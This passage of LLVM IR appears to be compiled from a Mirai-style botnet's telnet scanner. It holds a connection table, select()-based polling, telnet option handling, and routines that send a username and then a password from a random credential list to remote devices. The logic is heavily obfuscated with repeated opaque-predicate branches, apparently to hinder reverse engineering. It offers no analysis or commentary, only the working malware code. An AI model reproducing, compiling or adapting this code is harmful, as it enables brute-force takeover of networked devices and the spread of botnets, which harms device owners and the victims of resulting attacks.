  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %919

; <label>:919:                                    ; preds = %originalBBpart2126, %878
  br label %952

; <label>:920:                                    ; preds = %originalBBpart2122
  %921 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %922 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %921, i32 0, i32 3
  %923 = load i32, i32* %922, align 8
  %924 = icmp ne i32 %923, 0
  br i1 %924, label %925, label %951

; <label>:925:                                    ; preds = %920
  %926 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %927 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %926, i32 0, i32 1
  %928 = load i32, i32* %927, align 8
  %929 = srem i32 %928, 64
  %930 = zext i32 %929 to i64
  %931 = shl i64 1, %930
  %932 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %933 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %934 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %933, i32 0, i32 1
  %935 = load i32, i32* %934, align 8
  %936 = sdiv i32 %935, 64
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds [16 x i64], [16 x i64]* %932, i64 0, i64 %937
  %939 = load i64, i64* %938, align 8
  %940 = or i64 %939, %931
  store i64 %940, i64* %938, align 8
  %941 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %942 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %941, i32 0, i32 1
  %943 = load i32, i32* %942, align 8
  %944 = load i32, i32* %11, align 4
  %945 = icmp sgt i32 %943, %944
  br i1 %945, label %946, label %950

; <label>:946:                                    ; preds = %925
  %947 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %948 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %947, i32 0, i32 1
  %949 = load i32, i32* %948, align 8
  store i32 %949, i32* %11, align 4
  br label %950

; <label>:950:                                    ; preds = %946, %925
  br label %951

; <label>:951:                                    ; preds = %950, %920
  br label %952

; <label>:952:                                    ; preds = %951, %919
  br label %953

; <label>:953:                                    ; preds = %952, %originalBBpart2118
  %954 = load i32, i32* %1, align 4
  %955 = add nsw i32 %954, 1
  store i32 %955, i32* %1, align 4
  br label %688

; <label>:956:                                    ; preds = %originalBBpart287
  %957 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 1
  store i64 0, i64* %957, align 8
  %958 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 0
  store i64 1, i64* %958, align 8
  %959 = load i32, i32* %12, align 4
  %960 = load i32, i32* %11, align 4
  %961 = icmp sgt i32 %959, %960
  br i1 %961, label %962, label %964

; <label>:962:                                    ; preds = %956
  %963 = load i32, i32* %12, align 4
  br label %982

; <label>:964:                                    ; preds = %956
  %965 = load i32, i32* @x.53
  %966 = load i32, i32* @y.54
  %967 = sub i32 %965, 1
  %968 = mul i32 %965, %967
  %969 = urem i32 %968, 2
  %970 = icmp eq i32 %969, 0
  %971 = icmp slt i32 %966, 10
  %972 = or i1 %970, %971
  br i1 %972, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %964
  %973 = load i32, i32* %11, align 4
  %974 = load i32, i32* @x.53
  %975 = load i32, i32* @y.54
  %976 = sub i32 %974, 1
  %977 = mul i32 %974, %976
  %978 = urem i32 %977, 2
  %979 = icmp eq i32 %978, 0
  %980 = icmp slt i32 %975, 10
  %981 = or i1 %979, %980
  br i1 %981, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %982

; <label>:982:                                    ; preds = %originalBBpart2130, %962
  %983 = phi i32 [ %963, %962 ], [ %973, %originalBBpart2130 ]
  %984 = add nsw i32 1, %983
  %985 = call i32 @select(i32 %984, %struct.fd_set.26* %5, %struct.fd_set.26* %6, %struct.fd_set.26* null, %struct.timeval.27* %8)
  store i32 %985, i32* %13, align 4
  %986 = call i64 @time(i64* null) #6
  %987 = trunc i64 %986 to i32
  store i32 %987, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %988

; <label>:988:                                    ; preds = %originalBBpart2268, %982
  %989 = load i32, i32* %1, align 4
  %990 = icmp slt i32 %989, 256
  br i1 %990, label %991, label %1778

; <label>:991:                                    ; preds = %988
  %992 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %993 = load i32, i32* %1, align 4
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %992, i64 %994
  store %struct.scanner_connection* %995, %struct.scanner_connection** %7, align 8
  %996 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %997 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %996, i32 0, i32 1
  %998 = load i32, i32* %997, align 8
  %999 = icmp eq i32 %998, -1
  br i1 %999, label %1000, label %1001

; <label>:1000:                                   ; preds = %991
  br label %1759

; <label>:1001:                                   ; preds = %991
  %1002 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %1003 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1004 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1003, i32 0, i32 1
  %1005 = load i32, i32* %1004, align 8
  %1006 = sdiv i32 %1005, 64
  %1007 = sext i32 %1006 to i64
  %1008 = getelementptr inbounds [16 x i64], [16 x i64]* %1002, i64 0, i64 %1007
  %1009 = load i64, i64* %1008, align 8
  %1010 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1011 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1010, i32 0, i32 1
  %1012 = load i32, i32* %1011, align 8
  %1013 = srem i32 %1012, 64
  %1014 = zext i32 %1013 to i64
  %1015 = shl i64 1, %1014
  %1016 = and i64 %1009, %1015
  %1017 = icmp ne i64 %1016, 0
  br i1 %1017, label %1018, label %1049

; <label>:1018:                                   ; preds = %1001
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %1019 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1020 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1019, i32 0, i32 1
  %1021 = load i32, i32* %1020, align 8
  %1022 = bitcast i32* %29 to i8*
  %1023 = call i32 @getsockopt(i32 %1021, i32 1, i32 4, i8* %1022, i32* %31) #6
  store i32 %1023, i32* %30, align 4
  %1024 = load i32, i32* %29, align 4
  %1025 = icmp eq i32 %1024, 0
  br i1 %1025, label %1026, label %1037

; <label>:1026:                                   ; preds = %1018
  %1027 = load i32, i32* %30, align 4
  %1028 = icmp eq i32 %1027, 0
  br i1 %1028, label %1029, label %1037

; <label>:1029:                                   ; preds = %1026
  %1030 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1031 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1030, i32 0, i32 3
  store i32 2, i32* %1031, align 8
  %1032 = call %struct.scanner_auth* @random_auth_entry()
  %1033 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1034 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1033, i32 0, i32 0
  store %struct.scanner_auth* %1032, %struct.scanner_auth** %1034, align 8
  %1035 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1036 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1035, i32 0, i32 6
  store i32 0, i32* %1036, align 4
  br label %1048

; <label>:1037:                                   ; preds = %1026, %1018
  %1038 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1039 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1038, i32 0, i32 1
  %1040 = load i32, i32* %1039, align 8
  %1041 = call i32 @close(i32 %1040)
  %1042 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1043 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1042, i32 0, i32 1
  store i32 -1, i32* %1043, align 8
  %1044 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1045 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1044, i32 0, i32 8
  store i8 0, i8* %1045, align 8
  %1046 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1047 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1046, i32 0, i32 3
  store i32 0, i32* %1047, align 8
  br label %1759

; <label>:1048:                                   ; preds = %1029
  br label %1049

; <label>:1049:                                   ; preds = %1048, %1001
  %1050 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %1051 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1052 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1051, i32 0, i32 1
  %1053 = load i32, i32* %1052, align 8
  %1054 = sdiv i32 %1053, 64
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds [16 x i64], [16 x i64]* %1050, i64 0, i64 %1055
  %1057 = load i64, i64* %1056, align 8
  %1058 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1059 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1058, i32 0, i32 1
  %1060 = load i32, i32* %1059, align 8
  %1061 = srem i32 %1060, 64
  %1062 = zext i32 %1061 to i64
  %1063 = shl i64 1, %1062
  %1064 = and i64 %1057, %1063
  %1065 = icmp ne i64 %1064, 0
  br i1 %1065, label %1066, label %1758

; <label>:1066:                                   ; preds = %1049
  %1067 = load i32, i32* @x.53
  %1068 = load i32, i32* @y.54
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %1066
  %1075 = load i32, i32* @x.53
  %1076 = load i32, i32* @y.54
  %1077 = sub i32 %1075, 1
  %1078 = mul i32 %1075, %1077
  %1079 = urem i32 %1078, 2
  %1080 = icmp eq i32 %1079, 0
  %1081 = icmp slt i32 %1076, 10
  %1082 = or i1 %1080, %1081
  br i1 %1082, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %1083

; <label>:1083:                                   ; preds = %1740, %originalBBpart2134
  %1084 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1085 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1084, i32 0, i32 3
  %1086 = load i32, i32* %1085, align 8
  %1087 = icmp eq i32 %1086, 0
  br i1 %1087, label %1088, label %1089

; <label>:1088:                                   ; preds = %1083
  br label %1741

; <label>:1089:                                   ; preds = %1083
  %1090 = load i32, i32* @x.53
  %1091 = load i32, i32* @y.54
  %1092 = sub i32 %1090, 1
  %1093 = mul i32 %1090, %1092
  %1094 = urem i32 %1093, 2
  %1095 = icmp eq i32 %1094, 0
  %1096 = icmp slt i32 %1091, 10
  %1097 = or i1 %1095, %1096
  br i1 %1097, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %1089
  %1098 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1099 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1098, i32 0, i32 6
  %1100 = load i32, i32* %1099, align 4
  %1101 = icmp eq i32 %1100, 256
  %1102 = load i32, i32* @x.53
  %1103 = load i32, i32* @y.54
  %1104 = sub i32 %1102, 1
  %1105 = mul i32 %1102, %1104
  %1106 = urem i32 %1105, 2
  %1107 = icmp eq i32 %1106, 0
  %1108 = icmp slt i32 %1103, 10
  %1109 = or i1 %1107, %1108
  br i1 %1109, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %1101, label %1110, label %1122

; <label>:1110:                                   ; preds = %originalBBpart2138
  %1111 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1112 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1111, i32 0, i32 7
  %1113 = getelementptr inbounds [256 x i8], [256 x i8]* %1112, i32 0, i32 0
  %1114 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1115 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1114, i32 0, i32 7
  %1116 = getelementptr inbounds [256 x i8], [256 x i8]* %1115, i32 0, i32 0
  %1117 = getelementptr inbounds i8, i8* %1116, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1113, i8* %1117, i64 192, i32 1, i1 false)
  %1118 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1119 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1118, i32 0, i32 6
  %1120 = load i32, i32* %1119, align 4
  %1121 = sub nsw i32 %1120, 64
  store i32 %1121, i32* %1119, align 4
  br label %1122

; <label>:1122:                                   ; preds = %1110, %originalBBpart2138
  %1123 = load i32, i32* @x.53
  %1124 = load i32, i32* @y.54
  %1125 = sub i32 %1123, 1
  %1126 = mul i32 %1123, %1125
  %1127 = urem i32 %1126, 2
  %1128 = icmp eq i32 %1127, 0
  %1129 = icmp slt i32 %1124, 10
  %1130 = or i1 %1128, %1129
  br i1 %1130, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1122
  %1131 = call i32* @__errno_location() #7
  store i32 0, i32* %1131, align 4
  %1132 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1132, i32 0, i32 1
  %1134 = load i32, i32* %1133, align 8
  %1135 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1136 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1135, i32 0, i32 7
  %1137 = getelementptr inbounds [256 x i8], [256 x i8]* %1136, i32 0, i32 0
  %1138 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1139 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1138, i32 0, i32 6
  %1140 = load i32, i32* %1139, align 4
  %1141 = sext i32 %1140 to i64
  %1142 = getelementptr inbounds i8, i8* %1137, i64 %1141
  %1143 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1143, i32 0, i32 6
  %1145 = load i32, i32* %1144, align 4
  %1146 = sub nsw i32 256, %1145
  %1147 = call i32 @recv_strip_null(i32 %1134, i8* %1142, i32 %1146, i32 16384)
  store i32 %1147, i32* %32, align 4
  %1148 = load i32, i32* %32, align 4
  %1149 = icmp eq i32 %1148, 0
  %1150 = load i32, i32* @x.53
  %1151 = load i32, i32* @y.54
  %1152 = sub i32 %1150, 1
  %1153 = mul i32 %1150, %1152
  %1154 = urem i32 %1153, 2
  %1155 = icmp eq i32 %1154, 0
  %1156 = icmp slt i32 %1151, 10
  %1157 = or i1 %1155, %1156
  br i1 %1157, label %originalBBpart2151, label %originalBB140alteredBB

originalBBpart2151:                               ; preds = %originalBB140
  br i1 %1149, label %1158, label %1160

; <label>:1158:                                   ; preds = %originalBBpart2151
  %1159 = call i32* @__errno_location() #7
  store i32 104, i32* %1159, align 4
  store i32 -1, i32* %32, align 4
  br label %1160

; <label>:1160:                                   ; preds = %1158, %originalBBpart2151
  %1161 = load i32, i32* %32, align 4
  %1162 = icmp eq i32 %1161, -1
  br i1 %1162, label %1163, label %1225

; <label>:1163:                                   ; preds = %1160
  %1164 = call i32* @__errno_location() #7
  %1165 = load i32, i32* %1164, align 4
  %1166 = icmp ne i32 %1165, 11
  br i1 %1166, label %1167, label %1224

; <label>:1167:                                   ; preds = %1163
  %1168 = load i32, i32* @x.53
  %1169 = load i32, i32* @y.54
  %1170 = sub i32 %1168, 1
  %1171 = mul i32 %1168, %1170
  %1172 = urem i32 %1171, 2
  %1173 = icmp eq i32 %1172, 0
  %1174 = icmp slt i32 %1169, 10
  %1175 = or i1 %1173, %1174
  br i1 %1175, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %1167
  %1176 = call i32* @__errno_location() #7
  %1177 = load i32, i32* %1176, align 4
  %1178 = icmp ne i32 %1177, 11
  %1179 = load i32, i32* @x.53
  %1180 = load i32, i32* @y.54
  %1181 = sub i32 %1179, 1
  %1182 = mul i32 %1179, %1181
  %1183 = urem i32 %1182, 2
  %1184 = icmp eq i32 %1183, 0
  %1185 = icmp slt i32 %1180, 10
  %1186 = or i1 %1184, %1185
  br i1 %1186, label %originalBBpart2155, label %originalBB153alteredBB

originalBBpart2155:                               ; preds = %originalBB153
  br i1 %1178, label %1187, label %1224

; <label>:1187:                                   ; preds = %originalBBpart2155
  %1188 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1189 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1188, i32 0, i32 1
  %1190 = load i32, i32* %1189, align 8
  %1191 = call i32 @close(i32 %1190)
  %1192 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1193 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1192, i32 0, i32 1
  store i32 -1, i32* %1193, align 8
  %1194 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1195 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1194, i32 0, i32 8
  %1196 = load i8, i8* %1195, align 8
  %1197 = add i8 %1196, 1
  store i8 %1197, i8* %1195, align 8
  %1198 = zext i8 %1197 to i32
  %1199 = icmp sge i32 %1198, 10
  br i1 %1199, label %1200, label %1205

; <label>:1200:                                   ; preds = %1187
  %1201 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1202 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1201, i32 0, i32 8
  store i8 0, i8* %1202, align 8
  %1203 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1204 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1203, i32 0, i32 3
  store i32 0, i32* %1204, align 8
  br label %1223

; <label>:1205:                                   ; preds = %1187
  %1206 = load i32, i32* @x.53
  %1207 = load i32, i32* @y.54
  %1208 = sub i32 %1206, 1
  %1209 = mul i32 %1206, %1208
  %1210 = urem i32 %1209, 2
  %1211 = icmp eq i32 %1210, 0
  %1212 = icmp slt i32 %1207, 10
  %1213 = or i1 %1211, %1212
  br i1 %1213, label %originalBB157, label %originalBB157alteredBB

originalBB157:                                    ; preds = %originalBB157alteredBB, %1205
  %1214 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1214)
  %1215 = load i32, i32* @x.53
  %1216 = load i32, i32* @y.54
  %1217 = sub i32 %1215, 1
  %1218 = mul i32 %1215, %1217
  %1219 = urem i32 %1218, 2
  %1220 = icmp eq i32 %1219, 0
  %1221 = icmp slt i32 %1216, 10
  %1222 = or i1 %1220, %1221
  br i1 %1222, label %originalBBpart2159, label %originalBB157alteredBB

originalBBpart2159:                               ; preds = %originalBB157
  br label %1223

; <label>:1223:                                   ; preds = %originalBBpart2159, %1200
  br label %1224

; <label>:1224:                                   ; preds = %1223, %originalBBpart2155, %1163
  br label %1741

; <label>:1225:                                   ; preds = %1160
  %1226 = load i32, i32* @x.53
  %1227 = load i32, i32* @y.54
  %1228 = sub i32 %1226, 1
  %1229 = mul i32 %1226, %1228
  %1230 = urem i32 %1229, 2
  %1231 = icmp eq i32 %1230, 0
  %1232 = icmp slt i32 %1227, 10
  %1233 = or i1 %1231, %1232
  br i1 %1233, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %1225
  %1234 = load i32, i32* %32, align 4
  %1235 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1236 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1235, i32 0, i32 6
  %1237 = load i32, i32* %1236, align 4
  %1238 = add nsw i32 %1237, %1234
  store i32 %1238, i32* %1236, align 4
  %1239 = load i32, i32* @fake_time, align 4
  %1240 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1241 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1240, i32 0, i32 2
  store i32 %1239, i32* %1241, align 4
  %1242 = load i32, i32* @x.53
  %1243 = load i32, i32* @y.54
  %1244 = sub i32 %1242, 1
  %1245 = mul i32 %1242, %1244
  %1246 = urem i32 %1245, 2
  %1247 = icmp eq i32 %1246, 0
  %1248 = icmp slt i32 %1243, 10
  %1249 = or i1 %1247, %1248
  br i1 %1249, label %originalBBpart2168, label %originalBB161alteredBB

originalBBpart2168:                               ; preds = %originalBB161
  br label %1250

; <label>:1250:                                   ; preds = %originalBBpart2243, %originalBBpart2168
  store i32 0, i32* %33, align 4
  %1251 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1252 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1251, i32 0, i32 3
  %1253 = load i32, i32* %1252, align 8
  switch i32 %1253, label %1673 [
    i32 2, label %1254
    i32 3, label %1278
    i32 4, label %1305
    i32 5, label %1380
    i32 6, label %1432
    i32 7, label %1468
    i32 8, label %1504
    i32 9, label %1540
    i32 10, label %1576
  ]

; <label>:1254:                                   ; preds = %1250
  %1255 = load i32, i32* @x.53
  %1256 = load i32, i32* @y.54
  %1257 = sub i32 %1255, 1
  %1258 = mul i32 %1255, %1257
  %1259 = urem i32 %1258, 2
  %1260 = icmp eq i32 %1259, 0
  %1261 = icmp slt i32 %1256, 10
  %1262 = or i1 %1260, %1261
  br i1 %1262, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1254
  %1263 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1264 = call i32 @consume_iacs(%struct.scanner_connection* %1263)
  store i32 %1264, i32* %33, align 4
  %1265 = icmp sgt i32 %1264, 0
  %1266 = load i32, i32* @x.53
  %1267 = load i32, i32* @y.54
  %1268 = sub i32 %1266, 1
  %1269 = mul i32 %1266, %1268
  %1270 = urem i32 %1269, 2
  %1271 = icmp eq i32 %1270, 0
  %1272 = icmp slt i32 %1267, 10
  %1273 = or i1 %1271, %1272
  br i1 %1273, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1265, label %1274, label %1277

; <label>:1274:                                   ; preds = %originalBBpart2172
  %1275 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1276 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1275, i32 0, i32 3
  store i32 3, i32* %1276, align 8
  br label %1277

; <label>:1277:                                   ; preds = %1274, %originalBBpart2172
  br label %1690

; <label>:1278:                                   ; preds = %1250
  %1279 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1280 = call i32 @consume_user_prompt(%struct.scanner_connection* %1279)
  store i32 %1280, i32* %33, align 4
  %1281 = icmp sgt i32 %1280, 0
  br i1 %1281, label %1282, label %1304

; <label>:1282:                                   ; preds = %1278
  %1283 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1284 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1283, i32 0, i32 1
  %1285 = load i32, i32* %1284, align 8
  %1286 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1287 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1286, i32 0, i32 0
  %1288 = load %struct.scanner_auth*, %struct.scanner_auth** %1287, align 8
  %1289 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1288, i32 0, i32 0
  %1290 = load i8*, i8** %1289, align 8
  %1291 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1292 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1291, i32 0, i32 0
  %1293 = load %struct.scanner_auth*, %struct.scanner_auth** %1292, align 8
  %1294 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1293, i32 0, i32 4
  %1295 = load i8, i8* %1294, align 4
  %1296 = zext i8 %1295 to i64
  %1297 = call i64 @send(i32 %1285, i8* %1290, i64 %1296, i32 16384)
  %1298 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1299 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1298, i32 0, i32 1
  %1300 = load i32, i32* %1299, align 8
  %1301 = call i64 @send(i32 %1300, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  %1302 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1303 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1302, i32 0, i32 3
  store i32 4, i32* %1303, align 8
  br label %1304

; <label>:1304:                                   ; preds = %1282, %1278
  br label %1690

; <label>:1305:                                   ; preds = %1250
  %1306 = load i32, i32* @x.53
  %1307 = load i32, i32* @y.54
  %1308 = sub i32 %1306, 1
  %1309 = mul i32 %1306, %1308
  %1310 = urem i32 %1309, 2
  %1311 = icmp eq i32 %1310, 0
  %1312 = icmp slt i32 %1307, 10
  %1313 = or i1 %1311, %1312
  br i1 %1313, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1305
  %1314 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1315 = call i32 @consume_pass_prompt(%struct.scanner_connection* %1314)
  store i32 %1315, i32* %33, align 4
  %1316 = icmp sgt i32 %1315, 0
  %1317 = load i32, i32* @x.53
  %1318 = load i32, i32* @y.54
  %1319 = sub i32 %1317, 1
  %1320 = mul i32 %1317, %1319
  %1321 = urem i32 %1320, 2
  %1322 = icmp eq i32 %1321, 0
  %1323 = icmp slt i32 %1318, 10
  %1324 = or i1 %1322, %1323
  br i1 %1324, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1316, label %1325, label %1363

; <label>:1325:                                   ; preds = %originalBBpart2176
  %1326 = load i32, i32* @x.53
  %1327 = load i32, i32* @y.54
  %1328 = sub i32 %1326, 1
  %1329 = mul i32 %1326, %1328
  %1330 = urem i32 %1329, 2
  %1331 = icmp eq i32 %1330, 0
  %1332 = icmp slt i32 %1327, 10
  %1333 = or i1 %1331, %1332
  br i1 %1333, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1325
  %1334 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1335 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1334, i32 0, i32 1
  %1336 = load i32, i32* %1335, align 8
  %1337 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1338 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1337, i32 0, i32 0
  %1339 = load %struct.scanner_auth*, %struct.scanner_auth** %1338, align 8
  %1340 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1339, i32 0, i32 1
  %1341 = load i8*, i8** %1340, align 8
  %1342 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1343 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1342, i32 0, i32 0
  %1344 = load %struct.scanner_auth*, %struct.scanner_auth** %1343, align 8
  %1345 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1344, i32 0, i32 5
  %1346 = load i8, i8* %1345, align 1
  %1347 = zext i8 %1346 to i64
  %1348 = call i64 @send(i32 %1336, i8* %1341, i64 %1347, i32 16384)
  %1349 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1350 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1349, i32 0, i32 1
  %1351 = load i32, i32* %1350, align 8
  %1352 = call i64 @send(i32 %1351, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  %1353 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1354 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1353, i32 0, i32 3
  store i32 5, i32* %1354, align 8
  %1355 = load i32, i32* @x.53
  %1356 = load i32, i32* @y.54
  %1357 = sub i32 %1355, 1
  %1358 = mul i32 %1355, %1357
  %1359 = urem i32 %1358, 2
  %1360 = icmp eq i32 %1359, 0
  %1361 = icmp slt i32 %1356, 10
  %1362 = or i1 %1360, %1361
  br i1 %1362, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %1363

; <label>:1363:                                   ; preds = %originalBBpart2180, %originalBBpart2176
  %1364 = load i32, i32* @x.53
  %1365 = load i32, i32* @y.54
  %1366 = sub i32 %1364, 1
  %1367 = mul i32 %1364, %1366
  %1368 = urem i32 %1367, 2
  %1369 = icmp eq i32 %1368, 0
  %1370 = icmp slt i32 %1365, 10
  %1371 = or i1 %1369, %1370
  br i1 %1371, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1363
  %1372 = load i32, i32* @x.53
  %1373 = load i32, i32* @y.54
  %1374 = sub i32 %1372, 1
  %1375 = mul i32 %1372, %1374
